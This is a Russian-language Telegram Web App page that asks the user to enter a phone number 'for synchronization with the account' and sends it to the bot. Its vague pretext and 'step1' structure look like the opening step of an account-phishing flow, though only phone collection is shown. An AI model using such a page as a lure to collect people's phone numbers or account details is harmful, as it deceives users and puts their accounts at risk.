<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #1c1c1c;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            width: 90%;
            max-width: 320px;
            text-align: center;
        }
        h3 { margin-bottom: 10px; font-size: 22px; }
        p { color: #aaaaaa; font-size: 14px; margin-bottom: 20px; }
        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: 1px solid #333;
            border-radius: 10px;
            background: #2b2b2b;
            color: white;
            box-sizing: border-box;
            text-align: center;
            font-size: 18px;
            outline: none;
        }
        input:focus { border-color: #248bcf; }
        button {
            width: 100%;
            padding: 15px;
            background: #248bcf;
            border: none;
            border-radius: 10px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        button:active { background: #1a6fa5; }
    </style>
</head>
<body>

    <div class="container" id="step1">
        <h3>Подтверждение</h3>
        <p>Введите номер телефона для синхронизации с аккаунтом</p>
        <input type="tel" id="phone" placeholder="+7 999 000-00-00">
        <button onclick="sendPhone()">Продолжить</button>
    </div>

    <script>
        // Инициализация Telegram WebApp
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        function sendPhone() {
            const phoneInput = document.getElementById("phone");
            const phone = phoneInput.value.trim();

            if (phone.length > 5) {
                // Отправляем данные боту
                tg.sendData("phone:" + phone);
                
                // Закрываем приложение (это стандарт для ReplyKeyboardButton)
                setTimeout(() => {
                    tg.close();
                }, 100);
            } else {
                alert("Пожалуйста, введите корректный номер телефона.");
            }
        }
    </script>
</body>
</html>
